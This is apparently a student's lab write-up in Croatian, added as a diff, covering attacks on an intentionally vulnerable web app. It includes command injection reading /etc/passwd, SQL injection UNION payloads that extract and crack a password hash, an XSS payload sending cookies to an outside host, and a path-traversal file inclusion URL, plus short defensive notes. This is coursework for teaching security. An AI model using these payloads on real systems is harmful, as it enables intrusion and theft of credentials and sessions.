@@ -1,0 +1,77 @@
+1. command injection	
+naredba: 
+	1 | cat /etc/passwd
+rezultat:
+	root:x:0:0:root:/root:/bin/bash
+	daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+	bin:x:2:2:bin:/bin:/usr/sbin/nologin
+	sys:x:3:3:sys:/dev:/usr/sbin/nologin
+	sync:x:4:65534:sync:/bin:/bin/sync
+	games:x:5:60:games:/usr/games:/usr/sbin/nologin
+	man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+	lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+	mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+	news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+	uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+	proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+	www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+	backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+	list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+	irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+	gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+	nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+	_apt:x:100:65534::/nonexistent:/bin/false
+	mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
+	
+2.SQL injection
+naredba:
+	3' UNION SELECT table_name, NULL FROM INFORMATION_SCHEMA.TABLES -- -
+		rezultat:
+			ID: 3' UNION SELECT table_name, NULL FROM INFORMATION_SCHEMA.TABLES -- -
+			First name: guestbook
+			Surname: 
+			ID: 3' UNION SELECT table_name, NULL FROM INFORMATION_SCHEMA.TABLES -- -
+			First name: users
+			Surname:  
+		
+	3' UNION SELECT NULL,  GROUP_CONCAT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users
+		rezultat:
+			ID: 3' UNION SELECT NULL,  GROUP_CONCAT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users
+			First name: 
+			Surname: user_id,first_name,last_name,user,password,avatar,last_login,failed_login
+	
+	4' OR '0'='0' UNION SELECT * FROM users WHERE '0'='0
+		rezultat:
+			ID: 4' OR '0'='0' UNION SELECT user_id, password FROM users WHERE '0'='0
+			First name: 4
+			Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+konacno:			
+	echo "0d107d09f5bbe40cade3de5c71e9e9b7" > hashes.txt
+	https://crackstation.net
+	0d107d09f5bbe40cade3de5c71e9e9b7	md5	letmein
+	
+3. Cross Site Scripting
+naredba:
+	<SCRIPT type="text/javascript">
+	alert(document.cookie)
+	</SCRIPT>
+	rezultat:
+		PHPSESSID=ufktq18l00ue3a52oqpjfauvp5; security=low
+naredba:		
+	<SCRIPT type="text/javascript">
+	var url = "http://mrepro.tel.fer.hr/srs?cookie="+document.cookie+"&jmbag=0036538682";
+	document.location.href=url;
+	alert(document.cookie);
+	</SCRIPT>
+kako zastititi:
+	-Ogranicenje podrzanih znakova ('<','>'...) izbacivanje opasnih
+	-Filtritranje tagova i kjucnih rijeci naredbi ('<script>')
+	
+4. File inclusion
+naredba:
+	href="http://192.168.56.101/vulnerabilities/fi/?page=../../../../../../etc/passwd"
+	to je stavljeno u href od file1 linka.
+	
+kako zastititi:
+	-filtriranje linka, npr.('%00') te se time postize da mora biti .php
+	-white listanje linkova na posluzitelju
